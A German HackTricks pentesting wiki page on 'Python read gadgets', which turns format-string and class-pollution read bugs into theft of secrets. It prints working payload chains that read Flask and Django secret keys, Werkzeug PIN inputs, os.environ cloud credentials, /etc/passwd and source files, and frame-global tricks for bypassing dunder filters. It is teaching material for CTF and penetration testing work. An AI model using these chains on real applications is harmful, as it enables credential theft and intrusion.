# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Verschiedene Schwachstellen wie [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) oder [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) können es dir ermöglichen, **interne Python-Daten auszulesen, erlauben dir jedoch nicht, Code auszuführen**. Daher muss ein Pentester diese Leseberechtigungen bestmöglich nutzen, um **sensible Berechtigungen zu erlangen und die Schwachstelle zu eskalieren**.

### Flask - Secret Key auslesen

Die Hauptseite einer Flask-Anwendung enthält wahrscheinlich das globale **`app`**-Objekt, in dem dieses **Secret** konfiguriert ist.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In diesem Fall ist es möglich, auf dieses Objekt zuzugreifen, indem irgendein Gadget zum **Zugreifen auf globale Objekte** von der [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) verwendet wird.

Falls sich **die Schwachstelle in einer anderen Python-Datei befindet**, benötigt man ein Gadget zum Durchlaufen von Dateien, um zur Hauptdatei zu gelangen, auf das globale Objekt `app.secret_key` **zuzugreifen** und [**mit Kenntnis dieses Schlüssels die Berechtigungen zu erweitern**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ein Payload wie dieser [aus diesem Writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Verwende diesen Payload, um **`app.secret_key` zu lesen**. Wenn der ursprüngliche Bug dir auch ein Schreibprimitive (zum Beispiel class pollution) gibt, kann derselbe Pfad verwendet werden, um ihn zu ersetzen und privilegiertere Flask-Cookies zu signieren.

### Werkzeug - machine_id und node uuid

[**Mit diesen Payloads aus diesem Writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) kannst du auf die **machine_id** und die **uuid** des Nodes zugreifen. Dabei handelt es sich um die **privaten Bits**, die du benötigst, um [**den Werkzeug-Pin zu generieren**](../../network-services-pentesting/pentesting-web/werkzeug.md) und auf die Python-Konsole unter `/console` zuzugreifen, wenn der **debug mode aktiviert** ist:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Beachte, dass du den **lokalen Pfad des Servers zu `app.py`** erhalten kannst, indem du auf der Webseite einen **Fehler** erzeugst, der dir den **Pfad** anzeigt.

Wenn sich die Schwachstelle in einer anderen Python-Datei befindet, verwende den vorherigen Flask-Trick, um auf die Objekte aus der Haupt-Python-Datei zuzugreifen.

### Django - SECRET_KEY und settings module

Das Django-Settings-Objekt wird in `sys.modules` zwischengespeichert, sobald die Anwendung startet. Mit ausschließlich Leseprimitiven kannst du den **`SECRET_KEY`**, Fallback-Keys, Datenbankzugangsdaten oder Signing-Salts leaken:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Wenn sich das verwundbare Gadget in einem anderen Modul befindet, gehe zuerst die Globals durch:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sind genauso wertvoll wie der aktuelle `SECRET_KEY`: Sie validieren während der Rotation weiterhin alte signierte Werte.<sup>[[1]](#references)</sup> Leake außerdem `SESSION_ENGINE` und `SESSION_SERIALIZER`, um schnell festzustellen, ob die Auswirkungen nur Cookie-Fälschung umfassen oder weiter reichen. Einzelheiten zu den Auswirkungen auf das Web findest du auf der [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module-Loader-Gadgets – Quellcode und Dateien lesen

Geladene Python-Module behalten normalerweise einen `__loader__`. Datei-basierte Loader stellen häufig `get_source()` und `get_data()` bereit. Diese sind perfekte **read-only primitives**, wenn du bereits auf ein Modulobjekt zugreifen kannst, aber nicht auf `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Dies ist sehr nützlich, um **config modules, blueprints, Hilfsdateien oder versteckte routes** auszulesen und API keys, DSNs, Flag-Pfade oder zusätzliche Gadget-Einstiegspunkte wiederherzustellen.

Wenn du nur über subclass enumeration verfügst, durchsuche den loader nach Namen, anstatt einen Index fest zu codieren:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globale Variablen von Generator-/Coroutine-Frames

Wenn du ein Generator-/Coroutine-Objekt erstellen oder erreichen kannst, kann dessen Frame globale Variablen leaken, **ohne ein `__globals__`-Gadget einer Funktion zu benötigen**. Das ist nützlich gegen Filter, die nur Dunder-Namen blockieren und Frame-Attribute wie `gi_frame`, `ag_frame`, `cr_frame` oder `f_globals` übersehen:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Sobald du über die Frame-Globals verfügst, fahre exakt wie bei den anderen Gadgets fort (`sys.modules`, settings objects, `os.environ` usw.). Aktuelle sandbox escapes entdecken dies immer wieder neu, weil `gi_frame` und `f_globals` keine dunder attributes sind und naive deny-lists häufig überleben.

### Environment variables / cloud creds via loaded modules

Viele Jails importieren weiterhin irgendwo `os` oder `sys`. Du kannst jede erreichbare Funktion `__init__.__globals__` missbrauchen, um zum bereits importierten `os`-Modul zu pivotieren und **Environment variables** auszulesen, die API tokens, cloud keys oder flags enthalten:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Wenn der Subklassenindex gefiltert wird, verwende Loader:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Umgebungsvariablen sind häufig die einzigen Secrets, die benötigt werden, um vom Auslesen zur vollständigen Kompromittierung überzugehen (Cloud-IAM-Keys, Datenbank-URLs, Signing-Keys usw.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) ermöglichte **class pollution** durch speziell erstellte Component-Requests. Das Setzen eines Property-Pfads wie `__init__.__globals__` erlaubte es einem Angreifer, auf die Globals des Component-Moduls und alle importierten Module zuzugreifen (z. B. `settings`, `os`, `sys`). Von dort aus können `SECRET_KEY`, `DATABASES` oder Service-Credentials geleakt werden, ohne Code Execution. Die Exploit-Kette basiert ausschließlich auf Lesezugriff und verwendet dieselben Dunder-Gadget-Muster wie oben.<sup>[[5]](#references)</sup>

### Gadget-Sammlungen zum Chaining

Aktuelle CTFs und Pyjail-Forschung zeigen zuverlässige Read-Chains, die ausschließlich mit Attribute Access und Subclass Enumeration aufgebaut werden. Community-gepflegte Listen wie [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogisieren Hunderte minimale Gadgets, die kombiniert werden können, um von Objekten zu `__globals__`, `sys.modules` und schließlich zu sensiblen Daten zu traversieren.<sup>[[2]](#references)</sup> Bevorzuge **attribut-/namensbasierte Suchen** gegenüber rohen Subclass-Indizes, da sich die Position von `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` usw. zwischen Python-Versionen und bei zusätzlich importierten Libraries ändert.

## Referenzen

- [1] [Django-Dokumentation zu kryptografischem Signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python-Sandbox-Gadget-Wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC-2023-Writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn-Class-Pollution-Schwachstelle, die zu RCE, XSS, DoS und Authentication Bypass führt (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)

{{#include ../../banners/hacktricks-training.md}}
